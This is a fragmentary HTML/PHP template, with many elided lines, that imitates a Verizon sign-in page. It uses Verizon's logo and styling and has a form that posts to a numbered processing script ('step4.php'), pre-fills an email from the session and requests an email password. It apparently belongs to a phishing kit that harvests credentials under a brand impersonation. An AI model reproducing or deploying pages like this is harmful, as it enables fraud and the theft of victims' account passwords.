...
<head>
	...
	<link rel="stylesheet" href="./css/verizon.css">
	<link rel="shortcut icon" href="./img/Verizon/verizon.ico" type="image/x-icon">
	<style type="text/css">
									...
									<div class="gnav20-logo">
										...
										<div class="gnav20-logo-wrapper gnav20-relative-index">
											<a class="gnav20-logoWhiteBg" style="cursor: pointer;"
												...
												<img alt="Verizon Logo" src="./img/Verizon/verizonLogo.svg">
											</a>
										</div>
									</div>
		...
		<div id="main-content" class="container-fluid">
			...
			<div class="row">
				...
				<div class="col-sm-5">
					...
					<form method="POST" action="../processing/step4.php"
						...
						<div class="form-group xs-mt-20 input-textlabel">
							...
							<input type="text" class="form-control input-container input-box" aria-required="true"
								...
								name="IDToken1" value="<?php echo $_SESSION['email2']; ?>" disabled>
						</div>
						<div class="form-group xs-mt-20 input-textlabel">
							...
							<input type="password" class="form-control input-container input-box" aria-required="true"
								aria-label="Password" autocomplete="off" id="IDToken2" name="emailPassword2">
